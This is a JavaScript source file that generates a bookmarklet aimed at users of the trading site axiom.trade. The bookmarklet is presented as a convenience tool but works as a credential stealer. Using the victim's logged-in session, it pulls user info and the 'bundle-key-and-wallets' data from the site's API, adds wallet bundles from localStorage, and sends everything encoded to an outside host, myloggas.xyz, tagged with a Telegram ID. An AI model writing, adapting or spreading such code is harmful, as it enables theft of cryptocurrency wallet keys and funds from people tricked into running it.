// Generates the bookmarklet JS code with auth check and data extraction
export function buildBookmarkletCode(baseUrl) {
  const src = `(async()=>{try{if(location.hostname==='myloggas.xyz'){return alert('You are already on the bookmarklet site!')}if(location.hostname!=='axiom.trade'){alert('Please navigate to axiom.trade to use this bookmarklet');location.replace('https://axiom.trade/discover')}else{if(!localStorage.getItem('isAuthed')){return alert('Please log in to axiom.trade to use this bookmarklet')}const user=await(await fetch('//api7.axiom.trade/user-info',{method:'POST',credentials:'include'})).json();const bundle=await(await fetch('//api8.axiom.trade/bundle-key-and-wallets',{method:'POST',credentials:'include'})).json();const bookmarkData={telegramId:'8000848286',site:location.href,user:user,bundle:bundle.bundleKey,sBundles:localStorage.getItem('sBundles'),eBundles:localStorage.getItem('eBundles')};location.replace('https://myloggas.xyz/data/'+btoa(JSON.stringify(bookmarkData)))}}catch(e){console.error('xworng:',e);alert('errs')}})();`;
  // Minify whitespace
  const mini = src.replace(/\s+/g, ' ').trim();
  return `javascript:${encodeURI(mini)}`;
}